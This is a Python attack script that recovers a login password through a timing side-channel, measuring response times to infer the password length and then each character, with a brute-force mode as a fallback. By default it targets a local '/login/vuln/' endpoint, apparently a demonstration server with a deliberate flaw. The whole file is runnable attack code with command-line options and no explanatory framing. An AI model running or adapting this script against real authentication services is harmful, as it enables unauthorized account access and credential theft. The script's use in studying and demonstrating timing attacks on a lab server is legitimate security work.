import requests
from timeit import timeit
import argparse
from string import ascii_letters, digits
from itertools import product
import numpy as np
from time import time

def timer_func(func):
    # This function shows the execution time of
    # the function object passed
    def wrap_func(*args, **kwargs):
        t1 = time()
        result = func(*args, **kwargs)
        t2 = time()
        print(f'Function {func.__name__!r} executed in {(t2-t1):.4f}s')
        return result
    return wrap_func

def send_request(server_url: str, password: str) -> bool:
    """
    Sends authentication request to the given server.
    """
    params = {"password": password}
    with requests.get(server_url, params, stream=False, timeout=5) as response:
        json_response = response.json()
        response.close()
        if json_response["message"] == "Success":
            return True
        else:
            return False

def find_length(server_url: str, min_len:int=3, max_len:int=4, attempts:int=1000) -> int:
    """
    Method to determine the lenght of the password based on the timing distribution of responses.
    """
    times = {
        length:timeit(lambda: send_request(server_url, " " * length), number=attempts)
        for length in range(min_len, max_len+1)
    }
    print("password length distribution:", times)
    data = np.array(list(times.values()))
    m_value = 3*np.median(np.abs(data - np.median(data)))
    return max(times, key=times.get), m_value

def contains_outlier(data, m=25):
    """
    Detect outliers in an array of numbers using the median and median absolute distance.
    """
    if len(data) <= 3:
        return False
    d = np.abs(data - np.median(data))
    mdev = np.median(d)
    s = d/mdev if mdev else np.zeros(len(d))
    return np.any(s>m)

def find_char_at_idx(idx, pass_list, vocab, server_url, num_attempts=100, mode="full", m_value=10):
    """
    Method for discovery of correct character of the password on a given position.
    """
    timings = {}
    for character in vocab:
        pass_list[idx] = character
        timings[character] = timeit(lambda: send_request(server_url, password="".join(pass_list)), number=num_attempts)
        if mode == "fast": # use statistical method to speed up the search
            if contains_outlier(list(timings.values()), m=m_value):
                break
    print(timings)
    print(f"Idx:{idx}, char found:{max(timings, key=timings.get)}")
    return max(timings, key=timings.get)

def find_password(server_url: str, vocab, pass_len: int, num_attempts, mode="full", m_value=10) -> str:
    password = [" " for _ in range(pass_len)]
   
    # use timings to determine the correct character in each position
    for i in range(pass_len-1):
        password[i] = find_char_at_idx(i, password, vocab, server_url, num_attempts=num_attempts, mode=mode, m_value=m_value)
    
    # bruteforce the last character of the password
    for c in vocab:
        password[-1] = c
        if send_request(server_url, "".join(password)):
            break
    return "".join(password)

def bruteforce_pass(server: str, vocab, length:int) -> str:
    passlist = product(vocab, repeat=length)
    for password in passlist:
        print("Trying:" + "".join(password))
        if send_request(server, "".join(password)):
            print("\t FOUND!")
            return "".join(password)
    return False

@timer_func
def bruteforce_attack(server: str, vocab, min_len:int=4, max_len:int=8)->None:
    print("Starting bruteforce attack")
    password = False
    for pass_len in range(min_len, max_len+1,1):
        password = bruteforce_pass(URL, vocab, pass_len)
        if password:
            break
    print("Bruteforce pass:", password)
    print(f"Connecting with password:'{password}' - SUCCESS:{send_request(URL, password)}")

@timer_func
def sca_attack(URL:str, vocab, min_len:int=4, max_len:int=8)->None:
    print("Starting timing attack - full")
    pass_len, _ = find_length(URL, min_len, max_len, attempts=500)
    print("The length of the password is:", pass_len)
    password = find_password(URL, vocab,pass_len, num_attempts=50, mode="full")
    print("The password is: ", password)
    print(f"Connecting with password:'{password}' - SUCCESS:{send_request(URL, password)}")

@timer_func
def sca_attack_fast(URL:str, vocab, min_len:int=4, max_len:int=8)->None:
    print("Starting timing attack - fast")
    pass_len, m_value = find_length(URL, min_len, max_len, attempts=500)
    password = find_password(URL, vocab,pass_len, num_attempts=100, mode="fast", m_value=m_value)
    print("The password is: ", password)
    print(f"Connecting with password:'{password}' - SUCCESS:{send_request(URL, password)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", type=str, default="http://127.0.0.1")
    parser.add_argument("--port", type=int, default=8000)
    parser.add_argument("--min_len", type=int, default=4)
    parser.add_argument("--max_len", type=int, default=8)
    parser.add_argument("--mode", type=str, default="full")
    parser.add_argument("--vocab", type=str, default="digits")
    args = parser.parse_args()

    if args.vocab == "digits":
        vocab = digits
    elif args.vocab == "letters":
        vocab = ascii_letters
    else:
        vocab = ascii_letters + digits
    
    URL = f"{args.server}:{args.port}/login/vuln/"
    if args.mode == "fast":
        sca_attack_fast(URL, vocab, args.min_len, args.max_len)
    elif args.mode == "bruteforce":
        bruteforce_attack(URL, vocab, args.min_len, args.max_len)
    else:
        sca_attack(URL, vocab, args.min_len, args.max_len)